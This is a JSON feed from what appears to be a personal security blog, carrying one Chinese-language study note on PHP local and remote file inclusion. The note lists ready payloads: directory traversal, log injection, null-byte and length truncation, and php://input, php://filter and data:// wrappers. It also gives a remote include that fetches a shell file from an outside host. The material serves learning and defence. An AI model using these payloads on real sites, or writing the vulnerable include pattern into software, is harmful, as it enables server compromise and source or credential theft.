{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"文件\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "title": "文件包含",
            "date_published": "2022-11-26T13:02:44.000Z",
            "content_html": "<h2 id=\"基础\"><a class=\"anchor\" href=\"#基础\">#</a> 基础</h2>\n<p>常见的文件包含漏洞的形式为  <code>&lt;?php include(&quot;inc/&quot; . $_GET['file']); ?&gt;</code></p>\n<p>考虑常用的几种包含方式为</p>\n<ul>\n<li>同目录包含  <code>file=.htaccess</code></li>\n<li>目录遍历  <code>?file=../../../../../../../../../var/lib/locate.db</code></li>\n<li>日志注入  <code>?file=../../../../../../../../../var/log/apache/error.log</code></li>\n<li>利用  <code>/proc/self/environ</code></li>\n</ul>\n<p>其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试</p>\n<h2 id=\"触发sink\"><a class=\"anchor\" href=\"#触发sink\">#</a> 触发 Sink</h2>\n<ul>\n<li>PHP\n<ul>\n<li>include\n<ul>\n<li>在包含过程中出错会报错，不影响执行后续语句</li>\n</ul>\n</li>\n<li>include_once\n<ul>\n<li>仅包含一次</li>\n</ul>\n</li>\n<li>require\n<ul>\n<li>在包含过程中出错，就会直接退出，不执行后续语句</li>\n</ul>\n</li>\n<li>require_once</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h2>\n<p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>\n<h3 id=\"url编码绕过\"><a class=\"anchor\" href=\"#url编码绕过\">#</a> url 编码绕过</h3>\n<p>如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过</p>\n<h3 id=\"特殊字符绕过\"><a class=\"anchor\" href=\"#特殊字符绕过\">#</a> 特殊字符绕过</h3>\n<ul>\n<li>某些情况下，读文件支持使用 Shell 通配符，如  <code>?</code>   <code>*</code>  等</li>\n<li>url 中 使用  <code>?</code>   <code>#</code>  可能会影响 include 包含的结果</li>\n<li>某些情况下，unicode 编码不同但是字形相近的字符有同一个效果</li>\n</ul>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>几乎是最常用的方法，条件是  <code>magic_quotes_gpc</code>  关闭，而且 php 版本小于 5.3.4。</p>\n<h3 id=\"长度截断\"><a class=\"anchor\" href=\"#长度截断\">#</a> 长度截断</h3>\n<p>Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。</p>\n<p>msdn 定义  <code>#define MAX_PATH 260</code> ，其中第 260 个字符为字符串结尾的  <code>\\0</code>  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。</p>\n<p>获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255</p>\n<p>那么在长度有限的时候， <code>././././</code>  (n 个) 的形式就可以通过这个把路径爆掉</p>\n<p>在 php 代码包含中，这种绕过方式要求 php 版本 &lt; php 5.2.8</p>\n<h3 id=\"伪协议绕过\"><a class=\"anchor\" href=\"#伪协议绕过\">#</a> 伪协议绕过</h3>\n<ul>\n<li>远程包含：要求  <code>allow_url_fopen=On</code>  且  <code>allow_url_include=On</code>  ， payload 为  <code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code>  的形式</li>\n<li>PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  <code>allow_url_include=On</code>  ，payload 为  <code>?file=php://input</code>  的形式</li>\n<li>Base64: 使用 Base64 伪协议读取文件，payload 为  <code>?file=php://filter/convert.base64-encode/resource=index.php</code>  的形式</li>\n<li>data: 使用 data 伪协议读取文件，payload 为  <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code>  的形式，要求  <code>allow_url_include=On</code></li>\n</ul>\n<h3 id=\"协议绕过\"><a class=\"anchor\" href=\"#协议绕过\">#</a> 协议绕过</h3>\n<p><code>allow_url_fopen</code>  和  <code>allow_url_include</code>  主要是针对  <code>http</code>   <code>ftp</code>  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。</p>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=\">Exploit with PHP Protocols</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==\">lfi cheat sheet</span></li>\n</ul>\n",
            "tags": [
                "包含",
                "文件",
                "目录"
            ]
        }
    ]
}